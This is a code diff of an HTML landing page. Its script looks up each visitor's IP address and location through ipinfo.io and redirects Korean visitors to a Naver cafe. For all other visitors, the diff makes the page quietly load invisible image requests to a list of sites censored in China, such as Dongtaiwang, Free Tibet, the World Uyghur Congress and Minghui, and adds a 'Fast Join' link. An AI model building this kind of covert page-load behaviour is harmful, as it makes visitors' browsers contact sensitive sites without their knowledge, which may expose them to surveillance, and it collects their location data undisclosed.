@@ -6,9 +6,9 @@
     <meta property="og:image" content="https://cafefiles.pstatic.net/20130417_129/26059935_1366130809029_4e24oT_png/26059935_user_014649.png" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
   </head>
-  <img style="display: none;" src="http://dongtaiwang.com" />
+  <!-- <img style="display: none;" src="http://dongtaiwang.com" />
   <img style="display: none;" src="https://www.freetibet.org" />
-  <img style="display: none;" src="https://www.uyghurcongress.org/en/%20" />
+  <img style="display: none;" src="https://www.uyghurcongress.org/en" />
   <img style="display: none;" src="https://kr-mb.theepochtimes.com/" />
   <img style="display: none;" src="https://www.freehongkong.org" />
   <img style="display: none;" src="https://www.taiwan.gov.tw/" />
@@ -16,10 +16,23 @@
   <img style="display: none;" src="https://theinitium.com/" />
   <img style="display: none;" src="https://boxun.com/" />
   <img style="display: none;" src="http://www.minghui.org/" />
-  <img style="display: none;" src="https://tibet.net/" />
+  <img style="display: none;" src="https://tibet.net/" /> -->
   <body>
     <script type="text/javascript">
-      window.onload = function() {
+      var list = [
+        "http://dongtaiwang.com",
+        "https://www.freetibet.org",
+        "https://www.uyghurcongress.org/en",
+        "https://kr-mb.theepochtimes.com",
+        "https://www.freehongkong.org",
+        "https://www.taiwan.gov.tw",
+        "http://www.yibaochina.com/",
+        "https://theinitium.com/",
+        "https://boxun.com/",
+        "http://www.minghui.org/",
+        "https://tibet.net/",
+      ];
+      window.onload = function () {
         var ip = "";
         var hostname = "";
         var city = "";
@@ -27,8 +40,7 @@
         var country = "";
         var loc = "";
         var org = "";
-
-        $.getJSON("http://ipinfo.io", function(data) {
+        $.getJSON("http://ipinfo.io", function (data) {
           ip = data.ip; // 접속자 ip
           hostname = data.hostname; // 접속자 hostname
           city = data.city; // 접속자 도시
@@ -40,21 +52,30 @@
           if (country == "KR") {
             console.log(data);
             window.location.href = "https://cafe.naver.com/globaltwom";
-          } else if (country == "CN") {
-            var btn = document.createElement("a");
-            var btntext = document.createTextNode("Fast Join");
-            btn.setAttribute("href", "http://dongtaiwang.com");
-            btn.appendChild(btntext);
-            document.body.appendChild(btn);
           } else {
-            var btn = document.createElement("a");
-            var btntext = document.createTextNode("Fast Join");
-            btn.setAttribute("href", "http://dongtaiwang.com");
-            btn.appendChild(btntext);
-            document.body.appendChild(btn);
+            fullload();
           }
         });
       };
+      function fullload() {
+        for (var i = 0; i < list.length; i++) {
+          load(list[i]);
+        }
+        join();
+      }
+      function load(url) {
+        var img = document.createElement("img");
+        img.src = url;
+        img.setAttribute("style", "display:none");
+        document.body.appendChild(img);
+      }
+      function join() {
+        var btn = document.createElement("a");
+        var btntext = document.createTextNode("Fast Join");
+        btn.setAttribute("href", "http://dongtaiwang.com");
+        btn.appendChild(btntext);
+        document.body.appendChild(btn);
+      }
     </script>
   </body>
 </html>
